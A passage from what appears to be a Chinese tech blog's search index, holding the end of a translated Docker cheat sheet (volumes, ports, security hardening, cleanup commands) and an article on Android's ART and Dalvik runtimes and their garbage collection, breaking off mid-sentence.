--volumes-from`。\n\n因为卷标是独立的文件系统，它们通常被用于存储各容器之间的瞬时状态。也就是说，你可以配置一个无状态临时容器，关掉之后，当你有第二个这种临时容器实例的时候，你可以从上一次保存的状态继续执行。\n\n查看 [卷标进阶](http://crosbymichael.com/advanced-docker-volumes.html) 来获取更多细节。[Container42](http://container42.com/2014/11/03/docker-indepth-volumes/) 非常有用。\n\n你可以 [将宿主 MacOS 的文件夹映射为 Docker 卷标](https://docs.docker.com/engine/tutorials/dockervolumes/#mount-a-host-directory-as-a-data-volume)：\n\n```\ndocker run -v /Users/wsargent/myapp/src:/src\n```\n\n你也可以用远程 NFS 卷标，如果你觉得你 [有足够勇气](https://docs.docker.com/engine/tutorials/dockervolumes/#/mount-a-shared-storage-volume-as-a-data-volume)。\n\n还可以考虑运行一个纯数据容器，像 [这里](http://container42.com/2013/12/16/persistent-volumes-with-docker-container-as-volume-pattern/) 所说的那样，提供可移植数据。\n\n记得，[文件也可以被挂载为卷标](#将文件挂载为卷标)。\n\n## 暴露端口(Exposing ports)\n\n通过宿主容器暴露输入端口相当 [繁琐但有效的](https://docs.docker.com/engine/reference/run/#expose-incoming-ports)。\n\n例如使用 `-p` 将容器端口映射到宿主端口上（只使用本地主机 (localhost) 接口）：\n\n```\ndocker run -p 127.0.0.1:$HOSTPORT:$CONTAINERPORT --name CONTAINER -t someimage\n```\n\n你可以使用 [EXPOSE](https://docs.docker.com/engine/reference/builder/#expose) 告知 Docker，该容器在运行时监听指定的端口：\n\n```\nEXPOSE <CONTAINERPORT>\n```\n\n但是注意 EXPOSE 并不会直接暴露端口，你需要用参数 `-p` 。比如说你要在 localhost 上暴露容器的端口:\n\n```\niptables -t nat -A DOCKER -p tcp --dport <LOCALHOSTPORT> -j DNAT --to-destination <CONTAINERIP>:<PORT>\n```\n\n如果你是在 Virtualbox 中运行 Docker，那么你需要配置端口转发 (forward the port)。使用 [forwarded_port](https://docs.vagrantup.com/v2/networking/forwarded_ports.html) 在 Vagrantfile 上配置暴露的端口范围，这样你就可以动态地映射了：\n\n```\nVagrant.configure(VAGRANTFILE_API_VERSION) do |config|\n  ...\n\n  (49000..49900).each do |port|\n    config.vm.network :forwarded_port, :host => port, :guest => port\n  end\n\n  ...\nend\n```\n\n如果你忘记了将什么端口映射到宿主机上的话，可使用 `docker port` 查看：\n\n```\ndocker port CONTAINER $CONTAINERPORT\n```\n\n## 最佳实践\n\n这里有一些最佳实践，以及争论焦点：\n\n* [The Rabbit Hole of Using Docker in Automated Tests](http://gregoryszorc.com/blog/2014/10/16/the-rabbit-hole-of-using-docker-in-automated-tests/)\n* [Bridget Kromhout](https://twitter.com/bridgetkromhout) has a useful blog post on [running Docker in production](http://sysadvent.blogspot.co.uk/2014/12/day-1-docker-in-production-reality-not.html) at Dramafever.  \n* There's also a best practices [blog post](http://developers.lyst.com/devops/2014/12/08/docker/) from Lyst.\n* [A Docker Dev Environment in 24 Hours!](https://engineering.salesforceiq.com/2013/11/05/a-docker-dev-environment-in-24-hours-part-2-of-2.html)\n* [Building a Development Environment With Docker](https://tersesystems.com/2013/11/20/building-a-development-environment-with-docker/)\n* [Discourse in a Docker Container](https://samsaffron.com/archive/2013/11/07/discourse-in-a-docker-container)\n\n## 安全(Security)\n\n这节准备讨论一些关于 Docker 安全性的问题。Docker 官方文档 [安全](https://docs.docker.com/articles/security/) 页面讲述了更多细节。\n\n首先第一件事：Docker 是有 root 权限的。如果你在 `docker` 组，那么你就有 [root 权限](https://web.archive.org/web/20161226211755/http://reventlov.com/advisories/using-the-docker-command-to-root-the-host)。如果你将 Docker 的 Unix Socket 暴露给容器，意味着你赋予了容器 [宿主机 root 权限](https://www.lvh.io/posts/dont-expose-the-docker-socket-not-even-to-a-container/)。\n\nDocker 不应当作为唯一的防御措施。你应当使其更加安全可靠。\n\n为了更好地理解容器暴露了什么，可参阅由 [Aaron Grattafiori](https://twitter.com/dyn___) 编写的 [Understanding and Hardening Linux Containers](https://www.nccgroup.trust/globalassets/our-research/us/whitepapers/2016/april/ncc_group_understanding_hardening_linux_containers-1-1.pdf)。这是一个完整全面且包含大量链接和脚注的容器问题指南，介绍了许多有用的内容。即使你已经加固过容器，以下的安全提示依然十分有帮助，但并不能代替理解的过程。\n\n### 安全提示\n\n为了最大的安全性，你应当考虑在虚拟机上运行 Docker。这是直接从 Docker 安全团队拿来的资料 -- [slides](http://www.slideshare.net/jpetazzo/linux-containers-lxc-docker-and-security) / [notes](http://www.projectatomic.io/blog/2014/08/is-it-safe-a-look-at-docker-and-security-from-linuxcon/)。之后，可使用 AppArmor、seccomp、SELinux、grsec 等来 [限制容器的权限](http://linux-audit.com/docker-security-best-practices-for-your-vessel-and-containers/)。更多细节，请查阅 [Docker 1.10 security features](https://blog.docker.com/2016/02/docker-engine-1-10-security/)。\n\nDocker 镜像 ID 属于 [敏感信息](https://medium.com/@quayio/your-docker-image-ids-are-secrets-and-its-time-you-treated-them-that-way-f55e9f14c1a4) 所以它不应该向外界公开。请将它们当作密码来对待。\n\n阅读由 [Thomas Sjögren](https://github.com/konstruktoid) 编写的 [Docker Security Cheat Sheet](https://github.com/konstruktoid/Docker/blob/master/Security/CheatSheet.adoc)：关于加固容器的不错的建议。\n\n查看 [Docker 安全测试脚本](https://github.com/docker/docker-bench-security)，下载 [最佳实践白皮书](https://blog.docker.com/2015/05/understanding-docker-security-and-best-practices/)。\n\n你应当远离使用非稳定版本 grsecurity / pax 的内核，比如 [Alpine Linux](https://en.wikipedia.org/wiki/Alpine_Linux)。如果在产品中用了 grsecurity，那么你应该考虑使用有 [商业支持](https://grsecurity.net/business_support.php) 的 [稳定版本](https://grsecurity.net/announce.php)，就像你对待 RedHat 那样。虽然要 $200 每月，但对于你的运维预算来说不值一提。\n\n从 Docker 1.11 开始，你可以轻松的限制在容器中可用的进程数，以防止 fork 炸弹。 这要求 Linux 内核 >= 4.3，并且要在内核配置中打开 CGROUP_PIDS=y。\n\n```\ndocker run --pids-limit=64\n```\n\n同时，你也可以限制进程再获取新权限。该功能是 Linux 内核从 3.5 版本开始就拥有的。你可以从 [这篇博客](http://www.projectatomic.io/blog/2016/03/no-new-privs-docker/) 中阅读到更多关于这方面的内容。\n\n```\ndocker run --security-opt=no-new-privileges\n```\n\n以下内容摘选自 [Container Solutions](http://container-solutions.com/is-docker-safe-for-production/) 的 [Docker Security Cheat Sheet](http://container-solutions.com/content/uploads/2015/06/15.06.15_DockerCheatSheet_A2.pdf)（PDF 版本，难以使用，故复制至此）：\n\n关闭内部进程通讯：\n\n```\ndocker -d --icc=false --iptables\n```\n\n设置容器为只读：\n\n```\ndocker run --read-only\n```\n\n通过 hashsum 来验证卷标：\n\n```\ndocker pull debian@sha256:a25306f3850e1bd44541976aa7b5fd0a29be\n```\n\n设置卷标为只读：\n\n```\ndocker run -v $(pwd)/secrets:/secrets:ro debian\n```\n\n在 Dockerfile 中定义用户并以该用户运行，避免在容器中以 ROOT 身份操作：\n\n```\nRUN groupadd -r user && useradd -r -g user user\nUSER user\n```\n\n### 用户命名空间(User Namespaces)\n\n还可以通过使用 [用户命名空间](https://s3hh.wordpress.com/2013/07/19/creating-and-using-containers-without-privilege/) -- 自 1.10 版本起已内置，但默认并未启用。\n\n要在 Ubuntu 15.10 中启用用户命名空间 (remap the userns)，请 [跟着这篇博客的例子](https://raesene.github.io/blog/2016/02/04/Docker-User-Namespaces/) 来做。\n\n### 安全相关视频\n\n* [Using Docker Safely](https://youtu.be/04LOuMgNj9U)\n* [Securing your applications using Docker](https://youtu.be/KmxOXmPhZbk)\n* [Container security: Do containers actually contain?](https://youtu.be/a9lE9Urr6AQ)\n* [Linux Containers: Future or Fantasy?](https://www.youtube.com/watch?v=iN6QbszB1R8)\n\n### 安全路线图\n\nDocker 的路线图提到关于 [seccomp 的支持](https://github.com/docker/docker/blob/master/ROADMAP.md#11-security)。\n一个名为 [bane](https://github.com/jfrazelle/bane) 的 AppArmor 策略生成器正在实现 [安全配置文件](https://github.com/docker/docker/issues/17142)。\n\n## 小贴士\n\n链接：\n\n* [15 Docker Tips in 5 minutes](http://sssslide.com/speakerdeck.com/bmorearty/15-docker-tips-in-5-minutes)\n* [CodeFresh Everyday Hacks Docker](https://codefresh.io/blog/everyday-hacks-docker/)\n\n### 清理\n\n最新的 [数据管理命令](https://github.com/docker/docker/pull/26108) 已在 Docker 1.13 实现：\n\n* `docker system prune`\n* `docker volume prune`\n* `docker network prune`\n* `docker container prune`\n* `docker image prune`\n\n### df 命令\n\n`docker system df` 将显示当前 Docker 各部分占用的磁盘空间。\n\n### Heredoc 声明 Docker 容器\n\n```\ndocker build -t htop - << EOF\nFROM alpine\nRUN apk --no-cache add htop\nEOF\n```\n\n### 最近一次的容器 ID\n\n```\nalias dl='docker ps -l -q'\ndocker run ubuntu echo hello world\ndocker commit $(dl) helloworld\n```\n\n### 带命令的提交（需要 Dockerfile）\n\n```\ndocker commit -run='{\"Cmd\":[\"postgres\", \"-too -many -opts\"]}' $(dl) postgres\n```\n\n### 获取 IP 地址\n\n```\ndocker inspect $(dl) | grep -wm1 IPAddress | cut -d '\"' -f 4\n```\n\n或使用 [jq](https://stedolan.github.io/jq/):\n\n```\ndocker inspect $(dl) | jq -r '.[0].NetworkSettings.IPAddress'\n```\n\n或使用 [go 模板](https://docs.docker.com/engine/reference/commandline/inspect)：\n\n```\ndocker inspect -f '{{ .NetworkSettings.IPAddress }}' <container_name>\n```\n\n或在通过 Dockerfile 构建镜像时，通过构建参数 (build argument) 传入：\n\n```\nDOCKER_HOST_IP=`ifconfig | grep -E \"([0-9]{1,3}\\.){3}[0-9]{1,3}\" | grep -v 127.0.0.1 | awk '{ print $2 }' | cut -f2 -d: | head -n1`\necho DOCKER_HOST_IP = $DOCKER_HOST_IP\ndocker build \\\n  --build-arg ARTIFACTORY_ADDRESS=$DOCKER_HOST_IP \n  -t sometag \\\n  some-directory/\n```\n\n### 获取端口映射\n\n```\ndocker inspect -f '{{range $p, $conf := .NetworkSettings.Ports}} {{$p}} -> {{(index $conf 0).HostPort}} {{end}}' <containername>\n```\n\n### 通过正则匹配容器\n\n```\nfor i in $(docker ps -a | grep \"REGEXP_PATTERN\" | cut -f1 -d\" \"); do echo $i; done`\n```\n\n### 获取环境变量配置\n\n```\ndocker run --rm ubuntu env\n```\n\n### 强行终止运行中的容器\n\n```\ndocker kill $(docker ps -q)\n```\n\n### 删除所有容器（强行删除！无论容器运行或停止）\n\n```\ndocker rm -f $(docker ps -qa)\n```\n\n### 删除旧容器\n\n```\ndocker ps -a | grep 'weeks ago' | awk '{print $1}' | xargs docker rm\n```\n\n### 删除已停止的容器\n\n```\ndocker rm -v `docker ps -a -q -f status=exited`\n```\n\n### 停止并删除容器\n\n```\ndocker stop $(docker ps -aq) && docker rm -v $(docker ps -aq)\n```\n\n### 删除无用 (dangling) 的镜像\n\n```\ndocker rmi $(docker images -q -f dangling=true)\n```\n\n### 删除所有镜像\n\n```\ndocker rmi $(docker images -q)\n```\n\n### 删除无用 (dangling) 的卷标\n\nDocker 1.9 版本起：\n\n```\ndocker volume rm $(docker volume ls -q -f dangling=true)\n```\n\n1.9.0 中，参数 `dangling=false` 居然 _没_ 用 - 它会被忽略然后列出所有的卷标。\n\n### 查看镜像依赖\n\n```\ndocker images -viz | dot -Tpng -o docker.png\n```\n\n### Docker 容器瘦身\n\n- 在某层 (RUN layer) 清理 APT\n\n这应当和其他 apt 命令在同一层中完成。\n否则，前面的层将会保持原有信息，而你的镜像则依旧臃肿。\n\n```\nRUN {apt commands} \\\n  && apt-get clean \\  \n  && rm -rf /var/lib/apt/lists/* /tmp/* /var/tmp/*\n```\n\n- 压缩镜像\n```\nID=$(docker run -d image-name /bin/bash)\ndocker export $ID | docker import – flat-image-name\n```\n\n- 备份\n```\nID=$(docker run -d image-name /bin/bash)\n(docker export $ID | gzip -c > image.tgz)\ngzip -dc image.tgz | docker import - flat-image-name\n```\n\n### 监视运行中容器的系统资源利用率\n\n检查某个容器的 CPU、内存以及网络 I/O 使用情况，你可以：\n```\ndocker stats <container>\n```\n\n按 ID 列出所有容器：\n```\ndocker stats $(docker ps -q)\n```\n\n按名称列出所有容器：\n```\ndocker stats $(docker ps --format '{{.Names}}')\n```\n\n按指定镜像名称列出所有容器：\n```\ndocker ps -a -f ancestor=ubuntu\n```\n\n删除所有未标签命名 (untagged) 的容器：\n```\ndocker rmi $(docker images | grep “^” | awk '{split($0,a,\" \"); print a[3]}')\n```\n\n通过正则匹配删除指定容器：\n```\ndocker ps -a | grep wildfly | awk '{print $1}' | xargs docker rm -f\n```\n\n删除所有已退出 (exited) 的容器：\n```\ndocker rm -f $(docker ps -a | grep Exit | awk '{ print $1 }')\n```\n\n### 将文件挂载为卷标\n\n文件也可以被挂载为卷标。例如你可以仅仅注入单个配置文件：\n\n``` bash\n# 从容器复制文件\ndocker run --rm httpd cat /usr/local/apache2/conf/httpd.conf > httpd.conf\n\n# 编辑文件\nvim httpd.conf\n\n# 挂载修改后的配置启动容器\ndocker run --rm -ti -v \"$PWD/httpd.conf:/usr/local/apache2/conf/httpd.conf:ro\" -p \"80:80\" httpd\n```","categories":["技巧"],"tags":["技巧","速查","Docker"]},{"title":"Android Runtime (ART) 和 Dalvik","url":"/2021/07/android-runtime-dalvik/","content":"\nAndroid Runtime (ART) 是 Android 上的应用和部分系统服务使用的托管式运行时。ART 及其前身 Dalvik 最初是专为 Android 项目打造的。作为运行时的 ART 可执行 Dalvik 可执行文件并遵循 Dex 字节码规范。\n\nART 和 Dalvik 是运行 Dex 字节码的兼容运行时，因此针对 Dalvik 开发的应用也能在 ART 环境中运作。不过，Dalvik 采用的一些技术并不适用于 ART。有关最重要问题的信息，请参阅[在 Android Runtime (ART) 上验证应用行为](http://developer.android.com/guide/practices/verifying-apps-art.html?hl=zh-cn)。\n\n<!-- more -->\n\n参考：https://source.android.com/devices/tech/dalvik?hl=zh-cn\n\n## ART 功能\n\n以下是 ART 实现的一些主要功能。\n\n### 预先 (AOT) 编译\n\nART 引入了预先编译机制，可提高应用的性能。ART 还具有比 Dalvik 更严格的安装时验证。\n\n在安装时，ART 使用设备自带的 **dex2oat** 工具来编译应用。此实用工具接受 [DEX](https://source.android.com/devices/tech/dalvik/dex-format?hl=zh-cn) 文件作为输入，并为目标设备生成经过编译的应用可执行文件。该工具应能够顺利编译所有有效的 DEX 文件。但是，一些后处理工具会生成无效文件，Dalvik 可以接受这些文件，但 ART 无法编译这些文件。如需了解详情，请参阅[处理垃圾回收问题](http://developer.android.com/guide/practices/verifying-apps-art.html?hl=zh-cn#GC_Migration)。\n\n### 垃圾回收方面的优化\n\n垃圾回收 (GC) 会耗费大量资源，这可能有损于应用性能，导致显示不稳定、界面响应速度缓慢以及其他问题。ART 通过以下几种方式对垃圾回收做了优化：\n\n- 大多采用并发设计，具有一次 GC 暂停\n- 并发复制，可减少后台内存使用和碎片\n- GC 暂停的时间不受堆大小影响\n- 在清理最近分配的短时对象这种特殊情况中，回收器的总 GC 时间更短\n- 优化了垃圾回收的工效，能够更加及时地进行并行垃圾回收，这使得 [`GC_FOR_ALLOC`](http://developer.android.com/tools/debugging/debugging-memory.html?hl=zh-cn#LogMessages) 事件在典型用例中极为罕见\n\n### 开发和调试方面的优化\n\nART 提供了大量功能来优化应用开发和调试。\n\n#### 支持采样分析器\n\n一直以来，开发者都使用 [Traceview](http://developer.android.com/tools/help/traceview.html?hl=zh-cn) 工具（用于跟踪应用执行情况）作为分析器。虽然 Traceview 可提供有用的信息，但每次方法调用产生的开销会导致 Dalvik 分析结果出现偏差，而且使用该工具明显会影响运行时性能。\n\nART 添加了对没有这些限制的专用采样分析器的支持，因而可更准确地了解应用执行情况，而不会明显减慢速度。KitKat 版本为 Dalvik 的 Traceview 添加了采样支持。\n\n#### 支持更多调试功能\n\nART 支持许多新的调试选项，特别是与监控和垃圾回收相关的功能。例如，您可以：\n\n- 查看堆栈跟踪中保留了哪些锁，然后跳转到持有锁的线程。\n- 询问指定类的当前活动的实例数、请求查看实例，以及查看使对象保持有效状态的参考。\n- 过滤特定实例的事件（如断点）。\n- 查看方法退出（使用“method-exit”事件）时返回的值。\n- 设置字段观察点，以在访问和/或修改特定字段时暂停程序执行。\n\n#### 优化了异常和崩溃报告中的诊断详细信息\n\n当发生运行时异常时，ART 会为您提供尽可能多的上下文和详细信息。ART 会提供 `java.lang.ClassCastException`、`java.lang.ClassNotFoundException` 和 `java.lang.NullPointerException` 的更多异常详细信息。（较高版本的 Dalvik 会提供 `java.lang.ArrayIndexOutOfBoundsException` 和 `java.lang.ArrayStoreException` 的更多异常详细信息，这些信息现在包括数组大小和越界偏移量；ART 也提供这类信息。）\n\n例如，`java.lang.NullPointerException` 现在会显示有关应用尝试处理 null 指针时所执行操作的信息，例如应用尝试写入的字段或尝试调用的方法。一些典型示例如下：\n\n```\njava.lang.NullPointerException: Attempt to write to field 'int\nandroid.accessibilityservice.AccessibilityServiceInfo.flags' on a null object\nreference\njava.lang.NullPointerException: Attempt to invoke virtual method\n'java.lang.String java.lang.Object.toString()' on a null object reference\n```\n\nART 还通过纳入 Java 和原生堆栈信息，在应用原生代码崩溃报告中提供更实用的上下文信息。\n\n\n## Android 8.0 中的 ART 功能改进\n\n在 Android 8.0 版本中，Android Runtime (ART) 有了极大改进。下面的列表总结了设备制造商可以在 ART 中获得的增强功能。\n\n### 并发压缩式垃圾回收器\n\n正如 Google 在 Google I/O 大会上所宣布的那样，ART 在 Android 8.0 中提供了新的并发压缩式垃圾回收器 (GC)。该回收器会在每次执行 GC 时以及应用正在运行时对堆进行压缩，且仅在处理线程根时短暂停顿一次。该回收器具有以下优势：\n\n- GC 始终会对堆进行压缩：堆的大小平均比 Android 7.0 中的小 32%。\n- 得益于压缩，系统现可实现线程局部碰撞指针对象分配：分配速度比 Android 7.0 中的快 70%。\n- H2 基准的停顿次数比 Android 7.0 GC 的少 85%。\n- 停顿次数不再随堆的大小而变化，应用在使用较大的堆时也无需担心造成卡顿。\n- GC 实现细节 - 读取屏障：\n    - 读取屏障是在读取每个对象字段时所做的少量工作。\n    - 它们在编译器中经过了优化，但可能会减慢某些用例的速度。\n\n### 循环优化\n\n在 Android 8.0 版本中，ART 采取了多种循环优化措施，具体如下：\n\n- 消除边界检查\n    - 静态：在编译时证明范围位于边界内\n    - 动态：运行时测试确保循环始终位于边界内（否则不进行优化）\n- 消除归纳变量\n    - 移除无用归纳\n    - 用封闭式表达式替换仅在循环后使用的归纳\n- 消除循环主体内的无用代码，移除整个死循环\n- 强度降低\n- 循环转换：逆转、交换、拆分、展开、单模等\n- SIMDization（也称为矢量化）\n\n循环优化器位于 ART 编译器中一个独立的优化环节中。大多数循环优化与其他方面的优化和简化类似。采用比平时更复杂的方式进行一些重写 CFG 的优化时会面临挑战，因为大多数 CFG 实用工具（请参阅 nodes.h）都侧重于构建而不是重写 CFG。\n\n### 类层次结构分析\n\n在 Android 8.0 中，ART 会使用类层次结构分析 (CHA)，这是一种编译器优化，可根据对类层次结构的分析结果，将虚拟调用去虚拟化为直接调用。虚拟调用代价高昂，因为它们围绕 vtable 查找来实现，且会占用几个依赖负载。另外，虚拟调用也不能内嵌。\n\n以下是对相关增强功能的总结：\n\n- 动态单一实现方法状态更新 - 在类关联时间结束时，如果 vtable 已被填充，ART 会按条目对超类的 vtable 进行比较。\n- 编译器优化 - 编译器会利用某种方法的单一实现信息。如果方法 A.foo 设置了单一实现标记，则编译器会将虚拟调用去虚拟化为直接调用，并借此进一步尝试内嵌直接调用。\n- 已编译代码无效 - 另外，在类关联时间结束时，如果单一实现信息已更新，且方法 A.foo 之前拥有单一实现，但该状态现已变为无效，则依赖方法 A.foo 拥有单一实现这一假设的所有已编译代码都需要变为无效代码。\n- 去优化 - 对于堆栈上已编译的有效代码，系统会启动去优化功能，以强制使已编译无效代码进入解释器模式，从而确保正确性。系统会采用结合了同步和异步去优化的全新去优化机制。\n\n### .oat 文件中的内嵌缓存\n\nART 现在采用内嵌缓存，并对有足够数据可用的调用站点进行优化。内嵌缓存功能会将额外的运行时信息记录到配置文件中，并利用这类信息将动态优化添加到预先编译中。\n\n### Dexlayout\n\nDexlayout 是在 Android 8.0 中引入的一个库，用于分析 dex 文件，并根据配置文件对其进行重新排序。Dexlayout 旨在使用运行时配置信息，在设备的空闲维护编译期间对 dex 文件的各个部分进行重新排序。通过将经常一起访问的部分 dex 文件集中在一起，程序可以因改进文件位置而拥有更好的内存访问模式，从而节省 RAM 并缩短启动时间。\n\n由于配置文件信息目前仅在运行应用后可用，因此系统会在空闲维护期间将 dexlayout 集成到 dex2oat 的设备编译中。\n\n### Dex 缓存移除\n\n在 Android 7.0 及更低版本中，DexCache 对象拥有四个大型数组，与 DexFile 中特定元素的数量成正比，即：\n\n- 字符串（每个 DexFile::StringId 一个引用），\n- 类型（每个 DexFile::TypeId 一个引用），\n- 方法（每个 DexFile::MethodId 一个原生指针），\n- 字段（每个 DexFile::FieldId 一个原生指针）。\n\n这些数组用于快速检索我们以前解析的对象。在 Android 8.0 中，除方法数组外，所有数组都已移除。\n\n### 解释器性能\n\n在 Android 7.0 版本中，通过引入 mterp（一种解释器，具有以汇编语言编写的核心提取/解码/解释机制），解释器性能得以显著提升。Mterp 模仿了快速 Dalvik 解释器，并支持 arm、arm64、x86、x86_64、mips 和 mips64。对于计算代码而言，ART 的 Mterp 大致相当于 Dalvik 的快速解释器。不过，有时候，它的速度可能会显著变慢，甚至急剧变慢：\n\n1. 调用性能。\n2. 字符串操作和 Dalvik 中其他被视为内嵌函数的高频用户方法。\n3. 堆栈内存使用量较高。\n\nAndroid 8.0 解决了这些问题。\n\n### 详细了解内嵌\n\n从 Android 6.0 开始，ART 可以内嵌同一个 dex 文件中的任何调用，但只能内嵌来自其他 dex 文件的叶方法。此项限制具有以下两个原因：\n\n1. 从其他 dex 文件进行内嵌要求使用该 dex 文件的 dex 缓存，这与同一个 dex 文件内嵌（只需重复使用调用方的 dex 缓存）有所不同。已编译代码中需要具有 dex 缓存，以便执行一系列指令，例如静态调用、字符串加载或类加载。\n2. 堆栈映射只对当前 dex 文件中的方法索引进行编码。\n\n为了应对这些限制，Android 8.0 做出了以下改进：\n\n1. 从已编译代码中移除 dex 缓存访问（另请参阅“Dex 缓存移除”部分）\n2. 扩展堆栈映射编码。\n\n### 同步方面的改进\n\nART 团队调整了 MonitorEnter/MonitorExit 代码路径，并减少了我们对 ARMv8 上传统内存屏障的依赖，尽可能将其替换为较新的（获取/释放）指令。\n\n### 更快速的原生方法\n\n使用 [`@FastNative`](https://android.googlesource.com/platform/libcore/+/master/dalvik/src/main/java/dalvik/annotation/optimization/FastNative.java) 和 [`@CriticalNative`](https://android.googlesource.com/platform/libcore/+/master/dalvik/src/main/java/dalvik/annotation/optimization/CriticalNative.java) 注解可以更快速地对 Java 原生接口 (JNI) 进行原生调用。这些内置的 ART 运行时优化可以加快 JNI 转换速度，并取代了现已弃用的 !bang JNI 标记。这些注解对非原生方法没有任何影响，并且仅适用于 `bootclasspath` 上的平台 Java 语言代码（无 Play 商店更新）。\n\n`@FastNative` 注解支持非静态方法。如果某种方法将 `jobject` 作为参数或返回值进行访问，请使用此注解。\n\n利用 `@CriticalNative` 注解，可更快速地运行原生方法，但存在以下限制：\n\n- 方法必须是静态方法 - 没有参数、返回值或隐式 `this` 的对象。\n- 仅将基元类型传递给原生方法。\n- 原生方法在其函数定义中不使用 `JNIEnv` 和 `jclass` 参数。\n- 方法必须使用 `RegisterNatives` 进行注册，而不是依靠动态 JNI 链接。\n\n`@FastNative` 和 `@CriticalNative` 注解在执行原生方法时会停用垃圾回收。不要与长时间运行的方法一起使用，包括通常很快但一般不受限制的方法。\n\n停顿垃圾回收可能会导致死锁。如果锁尚未得到本地释放（即尚未返回受管理代码），请勿在原生快速调用期间获取锁。此要求不适用于常规的 JNI 调用，因为 ART 将正执行的原生代码视为已暂停的状态。\n\n`@FastNative` 可以使原生方法的性能提升高达 3 倍，而 `@CriticalNative` 可以使原生方法的性能提升高达 5 倍。例如，在 Nexus 6P 设备上测量的 JNI 转换如下：\n\n| Java 原生接口 (JNI) 调用 | 执行时间（以纳秒计） |\n| :----------------------- | :------------------- |\n| 常规 JNI                 | 115                  |\n| !bang JNI                | 60                   |\n| `@FastNative`            | 35                   |\n| `@CriticalNative`        | 25                   |\n\n\n\n## 调试 ART 垃圾回收\n\n本页介绍了如何调试 Android 运行时 (ART) 垃圾回收 (GC) 的正确性和性能问题。此外，还说明了如何使用 GC 验证选项、确定应对 GC 验证失败的解决方案，以及衡量并解决 GC 性能问题。\n\n如需使用 ART，请参阅此 [ART 和 Dalvik](https://source.android.com/devices/tech/dalvik?hl=zh-cn) 部分中介绍的内容，以及 [Dalvik 可执行文件格式](https://source.android.com/devices/tech/dalvik/dex-format?hl=zh-cn)。如需获得验证应用行为方面的其他帮助，请参阅[在 Android Runtime (ART) 上验证应用行为](http://developer.android.com/guide/practices/verifying-apps-art?hl=zh-cn)。\n\n### ART GC 概览\n\nART 有多个不同的 GC 方案，涉及运行不同的垃圾回收器。从 Android 8 (Oreo) 开始，默认方案是并发复制 (CC)。另一个 GC 方案是并发标记清除 (CMS)。\n\n并发复制 GC 的一些主要特性包括：\n\n- CC 支持使用名为“RegionTLAB”的触碰指针分配器。此分配器可以向每个应用线程分配一个线程本地分配缓冲区 (TLAB)，这样，应用线程只需触碰“栈顶”指针，而无需任何同步操作，即可从其 TLAB 中将对象分配出去。\n- CC 通过在不暂停应用线程的情况下并发复制对象来执行堆碎片整理。这是在读取屏障的帮助下实现的，读取屏障会拦截来自堆的引用读取，无需应用开发者进行任何干预。\n- GC 只有一次很短的暂停，对于堆大小而言，该次暂停在时间上是一个常量。\n- 在 Android 10 及更高版本中，CC 会扩展为分代 GC。它支持轻松回收存留期较短的对象，这类对象通常很快便会无法访问。这有助于提高 GC 吞吐量，并显著延迟执行全堆 GC 的需要。\n\nART 仍然支持的另一个 GC 方案是 CMS。此 GC 方案还支持压缩，但不是以并发方式。在应用进入后台之前，它会避免执行压缩，应用进入后台后，它会暂停应用线程以执行压缩。如果对象分配因碎片而失败，也必须执行压缩操作。在这种情况下，应用可能会在一段时间内没有响应。\n\n由于 CMS 很少进行压缩，因此空闲对象可能会不连续。CMS 使用一个名为 RosAlloc 的基于空闲列表的分配器。与 RegionTLAB 相比，该分配器的分配成本较高。最后，由于内部碎片，Java 堆的 CMS 内存用量可能会高于 CC 内存用量。\n\n### GC 验证和性能选项\n\n#### 更改 GC 类型\n\n原始设备制造商 (OEM) 可以更改 GC 类型。如需进行更改，需要在构建时设置 `ART_USE_READ_BARRIER` 环境变量。默认值为 true，这会启用 CC 回收器，因为该回收器使用读取屏障。对于 CMS，此变量应明确设置为 false。\n\n默认情况下，在 Android 10 及更高版本中，CC 回收器在分代模式下运行。如需停用分代模式，可以使用 `-Xgc:nogenerational_cc` 命令行参数。或者，也可以按如下方式设置系统属性：\n\n```\nadb shell setprop dalvik.vm.gctype nogenerational_cc\n```\n\nCMS 回收器始终在分代模式下运行。\n\n\n#### 验证堆\n\n堆验证可能是调试 GC 相关错误或堆损坏的最有用的 GC 选项。启用堆验证会使 GC 在垃圾回收过程中在几个点检查堆的正确性。堆验证的选项与更改 GC 类型的相同。启用后，堆验证流程会验证根，并确保可访问对象仅引用了其他可访问对象。您可以通过传入以下 `-Xgc` 值来启用 GC 验证：\n\n- 启用后，`[no]preverify` 将在启动 GC 之前执行堆验证。\n- 启用后，`[no]presweepingverify` 将在开始垃圾回收器清除过程之前执行堆验证。\n- 启用后，`[no]postverify` 将在 GC 完成清除之后执行堆验证。\n- `[no]preverify_rosalloc`、`[no]postsweepingverify_rosalloc` 和 `[no]postverify_rosalloc` 是附加 GC 选项，仅验证 RosAlloc 内部记录的状态。因此，它们仅适用于使用 RosAlloc 分配器的 CMS 回收器。验证的主要内容是，魔法值是否与预期常量匹配，以及可用内存块是否已全部在 `free_page_runs_` 映射中注册。\n\n### 性能\n\n衡量 GC 性能的工具主要有两个：GC 时序转储和 Systrace。Systrace 还有一个高级版本，称为 Perfetto。如需衡量 GC 性能问题，直观的方法是使用 Systrace 和 Perfetto 确定哪些 GC 会导致长时间暂停或抢占应用线程。尽管 ART GC 经过多年发展已得到显著改进，但不良更改器行为（例如过度分配）仍会导致性能问题\n\n#### 回收策略\n\nCC GC 通过运行新生代 GC 或全堆 GC 来回收垃圾。理想情况下，新生代 GC 的运行频率更高。GC 会一直执行新生代 CC 回收，直到刚结束的回收周期的吞吐量（计算公式是：释放的字节数除以 GC 持续秒数）小于全堆 CC 回收的平均吞吐量。发生这种情况时，将为下一次并发 GC 选择全堆 CC（而不是新生代 CC）。全堆回收完成后，下一次 GC 将切换回新生代 CC。新生代 CC 在完成后不会调整堆占用空间限制，这是此策略发挥作用的一个关键因素。这使得新生代 CC 运行得越来越频繁，直到吞吐量低于全堆 CC，最终导致堆增大。\n\n#### 使用 SIGQUIT 获取 GC 性能信息\n\n如需获得应用的 GC 性能时序，请将 `SIGQUIT` 发送到已在运行的应用，或者在启动命令行程序时将 `-XX:DumpGCPerformanceOnShutdown` 传递给 `dalvikvm`。当应用获得 ANR 请求信号 (`SIGQUIT`) 时，会转储与其锁定、线程堆栈和 GC 性能相关的信息。\n\n如需获得 GC 时序转储，请使用以下命令：\n\n```\nadb shell kill -S QUIT PID\n```\n\n这会在 `/data/anr/` 中创建一个文件（名称中会包含日期和时间，例如 anr_2020-07-13-19-23-39-817）。此文件包含一些 ANR 转储信息以及 GC 时序。您可以通过搜索“Dumping cumulative Gc timings”（转储累计 GC 时序）来确定 GC 时序。这些时序会显示一些需要关注的内容，包括每个 GC 